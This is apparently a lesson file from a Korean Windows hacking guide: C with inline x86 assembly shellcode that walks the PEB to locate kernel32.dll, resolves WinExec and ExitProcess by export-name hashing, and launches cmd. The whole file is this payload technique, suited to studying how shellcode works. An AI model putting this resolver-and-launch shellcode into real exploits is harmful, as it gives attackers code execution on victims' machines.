/*
 *	c ==> 윈도우해킹가이드, kerenl32.dll 내부의 함수주소를 구해서 WinExec, ExitProcess를 통해 cmd 쉘을 여는 쉘코드
 */
#include <stdio.h>

void main()
{
	_asm{
			jmp start

get_func_addr:
loop_ent:
			inc edx  // index++
			lodsd    // eax + *eso, esi += 4
			pushad
			add ebx, eax
			mov esi, ebx
			xor eax, eax
			xor edi, edi
hash:
			lodsb
			add edi, eax
			test al, al
			jnz hash
			mov [ebp+0x10], edi
			popad
			cmp [ebp+0x10], edi
			jne loop_ent
			// get WinExec address
			movzx edx, word ptr [ecx+edx*2-2] // Ordinal
			mov edi, [ebp+0x18]
			mov esi, [edi+0x1c]  // Export Address Table
			mov edi, ebx
			add esi, edi
			add edi, [esi+edx*4] // Address Table
			mov eax, edi
			// edi = 함수주소 리턴
			ret

start:
			// cmd 문자열
			xor eax, eax
			mov [ebp+0xc], eax
			mov [ebp+0xc], 0x63 
			mov [ebp+0xd], 0x6d
			mov [ebp+0xe], 0x64 

			// kernel32.dll base address 구함
			mov eax, fs:[eax+0x30] // PEB
			mov eax, [eax+0xc] 	   // PED_LDR_DATA
			mov eax, [eax+0x14]	   // .exe InMemoryOrderModuleList
			mov ebx, [eax] 		// ntdll.dll InMemoryOrderLinks
			mov ebx, [ebx] 		// kernel32.dll InMemoryOrderLinks
			mov ebx, [ebx+0x10] // ebx = kerenl32.dll base address

			// export table
			mov edi, [ebx+0x3c]		// PE Header
			add edi, ebx
			mov edi, [edi+0x78]		// Export Table
			add edi, ebx
			mov [ebp+0x18], edi
			mov esi, [edi+0x20]		// Export Name Table
			add esi, ebx
			mov ecx, [edi+0x24]		// Ordinal Table
			add ecx, ebx			// ecx = Ordinal Table
			xor edx, edx
			pushad

			// WinExec 함수 주소 구함
			xor edi, edi
			mov di, 0x2b3
			call get_func_addr
			mov [ebp+0x20], eax
			popad

			// ExitProcess 함수 주소 구함
			xor edi, edi
			add di, 0x479
			call get_func_addr
			mov [ebp+0x24], eax

			// WinExec 실행
			xor eax, eax
			push eax
			lea eax, [ebp+0xc] // cmd
			push eax
			call [ebp+0x20]  // WinExec('cmd',0)

			// ExitProcess 실행
			xor eax, eax
			push eax
			call [ebp+0x24]
	}
}
